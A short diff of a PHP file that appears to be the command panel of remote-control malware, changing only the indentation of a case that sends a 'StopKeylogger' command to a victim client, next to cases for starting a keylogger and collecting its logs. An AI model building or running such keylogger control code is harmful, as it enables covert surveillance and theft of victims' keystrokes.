@@ -270,10 +270,10 @@ function POST($file_name,$data){
                Send($clientHWD, 'StartKeylogger');
                break;
 
-                case 'stopkl':
-                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
-                    Send($clientHWD, 'StopKeylogger');
-                    break;
+            case 'stopkl':
+                echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
+                Send($clientHWD, 'StopKeylogger');
+                break;
 
                 case 'getlogs':
                     echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
